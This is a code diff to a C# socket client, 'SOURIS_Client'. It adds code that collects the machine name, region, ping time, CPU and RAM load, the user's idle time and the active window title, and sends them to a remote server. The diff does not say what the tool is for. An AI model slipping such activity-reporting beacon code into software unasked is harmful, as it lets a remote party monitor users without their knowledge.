@@ -3,6 +3,12 @@ using System.Text;
 using System.Threading;
 using System.Net.Sockets;
 using System.Net;
+using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Management;
+using System.Linq;
+using System.Net.NetworkInformation;
+using System.Runtime.InteropServices;
 
 namespace SOURIS_Client
 {
@@ -35,7 +41,85 @@ namespace SOURIS_Client
 
         // The response from the remote device.
         private static String response = String.Empty;
+        [DllImport("User32.dll")]
+        private static extern bool
+                GetLastInputInfo(ref LASTINPUTINFO plii);
+        [StructLayout(LayoutKind.Sequential)]
+        struct LASTINPUTINFO
+        {
+            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
 
+            [MarshalAs(UnmanagedType.U4)]
+            public UInt32 cbSize;
+            [MarshalAs(UnmanagedType.U4)]
+            public UInt32 dwTime;
+        }
+        static string GetLastInputTime()
+        {
+            uint idleTime = 0;
+            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
+            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
+            lastInputInfo.dwTime = 0;
+            uint envTicks = (uint)Environment.TickCount;
+            if (GetLastInputInfo(ref lastInputInfo))
+            {
+                uint lastInputTick = lastInputInfo.dwTime;
+
+                idleTime = envTicks - lastInputTick;
+            }
+            uint Seconds = ((idleTime > 0) ? (idleTime / 1000) : 0);
+            if (Seconds > 30)
+            {
+                TimeSpan time = TimeSpan.FromSeconds(Seconds);
+                string str = time.ToString(@"hh\:mm\:ss\:fff");
+                return str;
+            }
+            else
+            {
+                return "Not Idle !";
+            }
+        }
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        private static string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
+        }
+        public static string CpuUsage()
+        {
+            PerformanceCounter cpuCounter;
+            cpuCounter = new PerformanceCounter();
+            cpuCounter.CategoryName = "Processor";
+            cpuCounter.CounterName = "% Processor Time";
+            cpuCounter.InstanceName = "_Total";
+            var currentCpuUsage = cpuCounter.NextValue();
+            Task.Delay(1000).Wait();
+            currentCpuUsage = cpuCounter.NextValue();
+            int cpuusageint = (int)currentCpuUsage;
+            return cpuusageint + "%";
+        }
+        public static string RamUsage()
+        {
+            var wmiObject = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
+
+            var memoryValues = wmiObject.Get().Cast<ManagementObject>().Select(mo => new {
+                FreePhysicalMemory = Double.Parse(mo["FreePhysicalMemory"].ToString()),
+                TotalVisibleMemorySize = Double.Parse(mo["TotalVisibleMemorySize"].ToString())
+            }).FirstOrDefault();
+
+            var percent = ((memoryValues.TotalVisibleMemorySize - memoryValues.FreePhysicalMemory) / memoryValues.TotalVisibleMemorySize) * 100;
+            return Math.Round(percent).ToString() + "%";
+        }
         private static void StartClient()
         {
             // Connect to a remote device.
@@ -56,9 +140,9 @@ namespace SOURIS_Client
                 client.BeginConnect(remoteEP,
                     new AsyncCallback(ConnectCallback), client);
                 connectDone.WaitOne();
-
+                string message = $"{Environment.MachineName}|{System.Globalization.RegionInfo.CurrentRegion.ToString()}|{new Ping().Send("www.google.com").RoundtripTime.ToString()}ms|{CpuUsage()}|{RamUsage()}|{GetLastInputTime()}|{GetActiveWindowTitle()}";
                 // Send test data to the remote device.
-                Send(client, "This is a test");
+                Send(client, message);
                 sendDone.WaitOne();
 
                 // Receive the response from the remote device.
